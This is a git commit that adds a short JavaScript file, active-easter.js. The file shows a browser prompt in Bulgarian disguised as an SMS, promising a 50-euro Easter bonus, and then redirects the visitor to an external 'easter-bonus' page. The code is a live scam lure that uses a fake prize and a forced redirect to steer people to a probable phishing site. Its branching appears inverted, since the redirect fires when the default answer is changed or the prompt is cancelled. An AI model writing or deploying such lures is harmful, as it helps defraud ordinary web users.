a93ff6374c0a4526b0a33a1adbead510ef1d3ae9
ekpanewblog5 <ukpehaitid3@gmail.com>
2026-03-16 22:42:21 -0700

    Create active-easter.js

---
+++ active-easter.js
@@ -0,0 +1,5 @@
+var password = 'ТЕГЛЕНЕ НА 50 EUR'
+password=prompt('SMS: Поздравления, имате право да получите 50 евро великденски бонуси, щракнете върху OK, за да ги заявите сега.','ТЕГЛЕНЕ НА 50 EUR');
+if (password != 'ТЕГЛЕНЕ НА 50 EUR') {
+location.href='https://ebekpone.com/easter-bonus.html';
+}
